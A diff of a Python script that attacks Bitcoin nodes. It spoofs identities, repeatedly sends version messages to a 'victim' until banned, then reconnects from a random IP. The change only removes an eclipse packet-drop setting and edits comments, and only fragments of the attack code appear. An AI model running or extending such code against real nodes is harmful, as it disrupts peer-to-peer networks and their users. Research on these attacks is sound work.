@@ -29,9 +29,6 @@ num_identities = 8
 # While attacking the victim, wait this many seconds before sending each version message
 seconds_between_version_packets = 0.1
 
-# Percentage (0 to 1) of packets to drop, else: relayed to victim
-eclipse_packet_drop_rate = 0
-
 
 
 
@@ -185,6 +182,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 	except:
 		print('Error: unable to  start thread to sniff interface {interface}')
 
+# Send version repeatedly, until banned
 def attack(socket, src_ip, src_port, dst_ip, dst_port, interface):
 	while True:
 		if seconds_between_version_packets != 0:
@@ -197,7 +195,7 @@ def attack(socket, src_ip, src_port, dst_ip, dst_port, interface):
 	print(f'Peer was banned ({src_ip} : {src_port})')
 	make_fake_connection(random_ip(), dst_ip, False)
 
-# Called when
+# Initialize the network
 def initialize_network_info():
 	print('Retrieving network info...')
 	global default_gateway, network_interface, broadcast_address
@@ -220,6 +218,7 @@ def initialize_network_info():
 		print('Error: Network broadcast IP couldn\'t be found.')
 		sys.exit()
 
+# Initialize Bitcoin info
 def initialize_bitcoin_info():
 	print('Retrieving bitcoin info...')
 	global bitcoin_subversion
@@ -262,6 +261,7 @@ def on_close():
 	cleanup_ipaliases()
 	cleanup_iptables()
 	print('Cleanup complete. Goodbye.')
+	
 	print('Verifying that internet works...')
 	if not internet_is_active():
 		reset_network()
